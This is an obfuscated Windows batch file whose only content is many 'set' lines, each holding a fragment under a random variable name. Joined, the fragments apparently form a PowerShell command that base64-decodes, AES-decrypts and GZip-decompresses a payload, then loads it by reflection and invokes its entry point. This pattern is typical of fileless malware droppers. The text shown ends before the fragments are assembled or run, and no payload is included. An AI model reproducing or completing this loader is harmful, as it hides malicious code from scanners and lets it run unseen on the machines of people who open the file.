@echo off
set "AFRYPYvuTM=Sy"
set "RlvAOtbnPH=rs"
set "syymwfBKiy=do"
set "mtALIxlpUh=ll"
set "HZYUGRjxyz=0\"
set "ATnlJGIlih=po"
set "HbpXCRZQMN=in"
set "GQHHOtlhmh=he"
set "IryAveZQmE=Wi"
set "KmrGWTglbM=we"
set "qoKdYKdduo=32"
set "JlUZpzliie=ws"
set "oOeaMzveCH= C"
set "smLwtlByGy=:\"
set "gOibNwUocw=ll"
set "ZYmqZoYNBh=Po"
set "aKNDwUpvrb=py"
set "iLsIxXfYlO=y "
set "eOTHGxKKSr= /"
set "sFxxShcHKG=\W"
set "FuvBJRHTEK=xe"
set "jAWEIpxMxp=.e"
set "sZhwyHzbtE=\v"
set "xcDUdouTPT=he"
set "eIGblbFXWG=em"
set "tlNhiNponH=st"
set "RuQqDGRpLz=nd"
set "vVpxZLZEQF=co"
set "hHfzAUFJSC=1."
set "UkNIZzIJAT=we"
set "pVbjmOZqjl=ow"
set "FsylWvhqHc=rS"
set "tQOStWqDEH=s\"
set "dRErUSgavV= %~dp0"
set "JUqEbnWiKS=cd"
set "PyDaOZYYdM=crD "
set "AvIIlSFBbY=TllA"
set "JNmvAJpwZq=.Mem"
set "AVwjiLqQFa=ert]"
set "CYhrSXiSCf=();$"
set "wAJuYPHKXy= '')"
set "rtJoIZfsts=iOdg"
set "lWmPOFpKjU=-joi"
set "svOzyHWZtN=pres"
set "CLUzGwtlUF=Syst"
set "FFERPCXWoi=raph"
set "teLjgxRpIE=th('"
set "piMVfVfbcC=P4Ia"
set "LAPJemiOkv=.Len"
set "HfDFLvxJYl=[]] "
set "tGnUvPwWIU== [S"
set "YMPEHrtpwn=znSk"
set "UAxjJsEdGH=.Dis"
set "DUCysfwlKV=;$nP"
set "hpvDMQlgiJ=k; }"
set "hofNLrygJh=em.I"
set "ZfHnRagyQq=d;$k"
set "SKzsRrbfEx=ect "
set "rPiToxLEpl=.Cre"
set "XfuomgcyWZ=Star"
set "iXVucmarDX= if "
set "dgDxeDXZme=lbBK"
set "gfScbdUSrr=rofi"
set "pAYzCzNUPn='')("
set "MBfZIrFZOV== $k"
set "RWErWEVsYP=.Dis"
set "WbDLsbIaxR=LlbB"
set "vwOeOmGriD=oint"
set "CDzZsnuCkI=K = "
set "IMZNhrKyZB=.Key"
set "SgKevtWDMJ=.Cry"
set "TUwwBmIwbg=am;$"
set "NlwhIJTGkx=.Sec"
set "ucvVoGsUnj=Mode"
set "iRoynMjxdx=('KY"
set "DScnmYHBXB=y.Pa"
set "xzGCLHSdTB=nirt"
set "lLKSepzUFK=htdo"
set "XKVWAdetWt= [Sy"
set "LsCKWumuIf=RWFj"
set "mqtcGgqQqN=$Llb"
set "GhuAHQBwhP===')"
set "ClwhxShLci=NGEN"
set "GZnqRTlWOA=Disp"
set "fViwCDrcYk=('%*'"
set "GOGjMjhpFg=-4] "
set "KCTpnkObjc=ct S"
set "CMYSbNPkWi=lit("
set "AYIBhtuYhX=.Cry"
set "djwPlwxVKy=NbN "
set "MINTtktBWe=Obje"
set "sexUmjXPgR=.Con"
set "XzDtfDvoPy=:('g"
set "uFxlCpgsFi=tOcr"
set "kasCsisoUo=ct S"
set "quASdclatR=ptog"
set "PuBQOyWyOq=1..-"
set "CGHTkYwoiz=ay()"
set "NCUTOsLfmV=/a3B"
set "xOeWoFcPNU=rity"
set "bNllpQuGCS=$htd"
set "ieMNzGxVdA=yste"
set "DGoHnznMqG=6] -"
set "qQtojDalPy=rtS4"
set "VxicSlaSHI=O.Me"
set "bSYbBAKdgm=oL'["
set "vemKwgcSSu=Obje"
set "ZdMkEEWMdB=esMa"
set "pyQxZLJOix=doO."
set "PSRFgGjHdG=flec"
set "KLcszTELBJ=F'[-"
set "EudxqTaFTb=]::("
set "rscJNvfMIw=6esa"
set "bKuzJrXawq=PhsR"
set "atBFnLwQMP='h6b"
set "gqDvVKyBDR=Vpgw"
set "lZalBRXrqY=ose("
set "moEJpfgPqY=form"
set "XRfAaMFeQK=O = "
set "UFLJQadjAR=null"
set "TdfODaWbdm=ne);"
set "WJPXPjDZch=ress"
set "uOkpxgyfQj=yTo("
set "oCahWGxhkv=.GZi"
set "SzjQkhnZaA=rity"
set "FaJDBxIgOS=();$"
set "hCTRWROLDd=esaB"
set "GomhOhwYBH=New-"
set "YaykVnCSoS=gMod"
set "zcYKQrspvv=LlbB"
set "DuUziuzIBy=gN+y"
set "vdPSSoUmHy=Fj.T"
set "YnUYBGfpDQ=V = "
set "Jkvcldlfqg=Zm ="
set "uOjANfnGrY=$gRW"
set "CmyvBycinC=urit"
set "RVSQGedCOi=onve"
set "cVLazWeUUj=le  "
set "JnvLYUssQv=kdkw"
set "wOnefFWgoM=dkwC"
set "qLCyzjwlQj=ose("
set "QpFUrPfiHd=);$g"
set "YqoYrsUPKz=y]::"
set "XZIfqZMEhG=grap"
set "cCOSOnwXtC= = $"
set "zqcAuEGlHy=dkwC"
set "CUxcElUwCX=Conv"
set "VKzZkUdKFf=bjec"
set "SNKXJJUYnp=pose"
set "wPclYmlPpr=)($L"
set "bHWwvlWlzx=stem"
set "EIhMBsGFuE=dkwC"
set "tFMIcWOZzv=ateD"
set "wzGXpPkpVa=).Sp"
set "wmzMMhWYhf=ach "
set "vwRFuKpEPz=ing("
set "gPgniRuMON=;$gP"
set "zZAwLFSVFn=Ti8L"
set "cIPNHklJUf=ke($"
set "RulYHifIlB=n ''"
set "VYEoCSOmzY=$gRW"
set "lsKtZxvKVM=gw.D"
set "MMhJekKdjc=.Cop"
set "lLoiWXTMei=iron"
set "JKcmzdeBNv=ress"
set "eXTYmZtnSy=zgMZ"
set "HWsjdpxgIo=$Llb"
set "dpGsPwqRFk=157K"
set "cgDCkxluBe=K = "
set "MKQCGnxdXH=mMK4"
set "PhksxSTzrp=Etk/"
set "ZoRheFSoJy=bN.T"
set "FDXWJLjMkc=Fj);"
set "kPdUaFoTsJ=:: '"
set "tuxafXtttR=lbBK"
set "DXLQpTEveT=m.IO"
set "mCrxPQGTCT=t Sy"
set "qUKaLPNyMX=, $L"
set "KJAowIuFaN=ecry"
set "KbbZapRtXt=-nop"
set "JXZKmPGqpg=]::("
set "nwByvyOGgd=;$PN"
set "bVJLpStlhP=  $A"
set "OyGKHXTEjP=vert"
set "bPpoLPqaAe=ss -"
set "WMVOuvgKiw=se()"
set "OKKQMKodxe=Invo"
set "yxWMTuQAbL=[Sys"
set "XOnebCNLNY=y.Ci"
set "dSlZAhbTvu=tS46"
set "UKcRHoTcSq=IVpg"
set "IrgyHNowxE=Fina"
set "frFsUBQwdy=Secu"
set "MEllYZDbYB=tem."
set "FrOXVyuXpx=ment"
set "mkaJekbftU=stem"
set "GWPJmSwfSH='[-1"
set "UMpIgzqYLV=::De"
set "EmKuJlZyPs=ddin"
set "mPaPhwport=ionM"
set "hHOmqYYtFd=Comp"
set "syeqWmzglr='[-1"
set "xUudJrHYeU=comp"
set "JyEQuaXjED==');"
set "ESEnjtLmDN=ode]"
set "PXepdBUMhT=);$k"
set "siXDVLAHmr=]::N"
set "tHkgOvfqAy=, (,"
set "MKAyFZeGPv=; };"
set "JIYrzvLBjO=New-"
set "rHAmEKJgCX= '')"
set "YgYLWgnMRd=brea"
set "qECuZPFaoJ=wfBW"
set "YGkgXTvytE=e = "
set "sRwMTTdlmX=S46e"
set "VwtEtEEMGz=Stre"
set "cxHVzCufwT=oryS"
set "QlqOFEsGwh=SoYj"
set "hdhlqJaYqN=z.En"
set "NKcOanFzgX= [Sy"
set "KjebiiYaaM=ring"
set "lAazhwgaNW=pStr"
set "zqUyWMMGFw=..-1"
set "yzYkAaocEo=BK);"
set "SYqLsafjPf=ypto"
set "fJfXRjazTZ=b6t6"
set "GTGOoYzoXt=raph"
set "ZoviEiLulx=..-1"
set "TfaOaCgvRB=]::C"
set "cNDKHGEtbv=in $"
set "mTHBDnSDWm=;$ht"
set "txkihkCjYF=)))"
set "iSRRUbshhW=hy.A"
set "VSvrXUPaMx=ddin"
set "kSyEeCOZWt=C.Pa"
set "mEIsjyhToA=-Obj"
set "DzzfnKqtou=16] "
set "tJzjRmpBmz=trea"
set "srKKpXSuuD= = ["
set "ZELsvYJzYM=m) {"
set "UCXfxntJtD= = $"
set "SpqwOshGqP=$gRW"
set "qRzesGCIKo=.IO."
set "fCHFDevWUD=.Com"
set "AwmVsbNWUm=Secu"
set "xDNLsNkGZe=BK ="
set "gjUHJErYZa=gth)"
set "kHpZltUkiD=PKCS"
set "xUYhNpIpjz=;$nP"
set "dcTCGVObNy=daeR"
set "DDpnPJZXMY=$nPN"
set "GLgFMycloJ=crD."
set "YbJUNqwgBD=tsWi"
set "HPOXWcomTl=pher"
set "XnstvyVxPI=);$g"
set "RYLVrsbAQK=and "
set "pVtSpYSOlF=('da"
set "VgyTGcqxDK=Fj ="
set "JRzTsUDKAK=Syst"
set "AJcbAGJpPf=g = "
